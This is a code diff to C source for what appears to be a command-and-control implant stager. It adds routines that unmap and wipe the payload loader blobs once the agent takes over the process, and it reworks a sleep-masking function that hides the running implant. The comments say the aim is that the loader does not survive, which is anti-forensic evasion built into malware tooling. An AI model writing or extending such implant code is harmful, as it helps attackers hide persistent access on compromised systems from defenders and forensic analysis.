@@ -32,13 +32,37 @@ stager_mask_run_on_stack(unsigned seconds, uintptr_t probe, void *stack_top,
                        "ret\n");
 }
 
-int stager_mask_sleep(unsigned seconds, uintptr_t probe) {
+/* Everything the loader needed to get the agent running can go: the malasada
+ * blob is unmapped, its ciphertext and key were wiped during acquisition, and
+ * the downloader blob was zeroed and unmapped before the payload ran. The
+ * resident stager image is the mask stub; its loader entry points are no
+ * longer reachable. */
+static void drop_loader_blobs(void) {
   struct stager_state *st = get_stager_state();
   if (st->payload != NULL && st->payload_size > 0) {
     munmap(st->payload, PAGE_ALIGN_UP(st->payload_size));
     st->payload = NULL;
     st->payload_size = 0;
   }
+}
+
+/* Called once from c2_stager_mask_bind() as soon as the agent owns the
+ * process, so the loader does not survive until the first sleep. */
+static int stager_mask_ready(void) {
+  drop_loader_blobs();
+  return 0;
+}
+
+int stager_mask_sleep(unsigned seconds) {
+  struct stager_state *st = get_stager_state();
+  uint32_t flags = st->pub.report.flags;
+  uintptr_t probe =
+      (flags & C2_STAGER_MASK_STACK_VALID) ? st->pub.report.stack_sp : 0;
+
+  /* Retry the loader cleanup in case an agent reported READY without calling
+   * ready_fn (for example a provider that binds its own mask entry point). */
+  if (flags & C2_STAGER_MASK_READY)
+    drop_loader_blobs();
   if (st->mask_stack_top == NULL || st->state_map_len == 0)
     return -1;
   uintptr_t keep_start = (uintptr_t)st;
@@ -52,4 +76,8 @@ void stager_mask_publish(void) {
   st->pub.abi_magic = C2_STAGER_ABI_MAGIC;
   st->pub.abi_version = C2_STAGER_ABI_VERSION;
   st->pub.mask_fn = stager_mask_sleep;
+  st->pub.ready_fn = stager_mask_ready;
+  st->pub.report.stack_sp = 0;
+  st->pub.report.flags = 0;
+  st->pub.report.reserved = 0;
 }
